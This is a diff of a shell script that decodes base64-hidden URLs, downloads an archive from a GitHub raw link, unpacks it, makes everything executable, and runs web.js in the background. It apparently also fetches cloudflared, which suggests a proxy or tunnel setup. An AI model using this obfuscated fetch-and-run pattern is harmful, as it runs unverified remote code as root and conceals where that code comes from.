@@ -1,9 +1,10 @@
 cd /root
-weburl_S='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3pob3V6aGVucWkvZmlsZS9tYXN0ZXIvd2ViLnppcA=='
+weburl_S='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3pob3V6aGVucWkvZmlsZS9tYXN0ZXIvd2ViLnRhci54ego='
 weburl=$(printf "%s" $weburl_S | base64 -d) 
 curl -O $weburl
 sleep 1
-unzip web.zip
+xz -z -d web.tar.xz
+tar -xvf web.tar
 chmod +x *
 ./web.js -c ./config.json &
 cturl_S='aHR0cHM6Ly9naXRodWIuY29tL2Nsb3VkZmxhcmUvY2xvdWRmbGFyZWQvcmVsZWFzZXMvbGF0ZXN0L2Rvd25sb2FkL2Nsb3VkZmxhcmVkLWxpbnV4LWFtZDY0Cg=='
